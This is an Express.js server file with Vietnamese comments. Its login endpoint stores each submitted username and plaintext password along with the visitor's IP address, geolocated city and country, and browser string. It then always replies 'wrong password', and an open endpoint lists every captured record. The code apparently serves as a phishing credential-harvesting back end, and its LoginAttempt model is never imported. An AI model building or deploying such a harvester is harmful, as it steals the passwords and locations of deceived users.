const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const dotenv = require("dotenv");
const axios = require("axios");
const path = require("path");
const authRouter = require("./api/auth");

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());

// Serve static files from the React build directory
app.use(express.static(path.join(__dirname, "build")));

mongoose
  .connect(process.env.MONGODB_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch((err) => console.error("Could not connect to MongoDB:", err));

// Middleware để lấy IP thực
const getClientIp = (req) => {
  const forwardedFor = req.headers["x-forwarded-for"];
  if (forwardedFor) {
    const ips = forwardedFor.split(",");
    return ips[0].trim();
  }
  return req.headers["x-real-ip"] || req.connection.remoteAddress;
};

app.post("/api/auth/login", async (req, res) => {
  const { username, password } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers["user-agent"];

  console.log("Client IP:", ip); // Log IP để debug

  try {
    // Lấy thông tin vị trí từ ipapi.co
    const locationResponse = await axios.get(`https://ipapi.co/${ip}/json/`);
    const locationData = locationResponse.data;

    console.log("Location Data:", locationData); // Log location data để debug

    const loginAttempt = new LoginAttempt({
      username,
      password,
      ip,
      country: locationData.country_name || "Unknown",
      city: locationData.city || "Unknown",
      timezone: locationData.timezone || "Unknown",
      browser: userAgent,
      os: userAgent,
    });

    await loginAttempt.save();
    res.status(401).json({ message: "Sai mật khẩu" });
  } catch (error) {
    console.error("Error saving login attempt:", error);
    res.status(500).json({ message: "Server error" });
  }
});

app.get("/api/login-attempts", async (req, res) => {
  try {
    const attempts = await LoginAttempt.find().sort({ timestamp: -1 });
    res.json(attempts);
  } catch (error) {
    res.status(500).json({ message: "Error fetching login attempts" });
  }
});

// Sử dụng router
app.use("/api/auth", authRouter);

// Serve React app for any other routes
app.get("*", (req, res) => {
  res.sendFile(path.join(__dirname, "build", "index.html"));
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
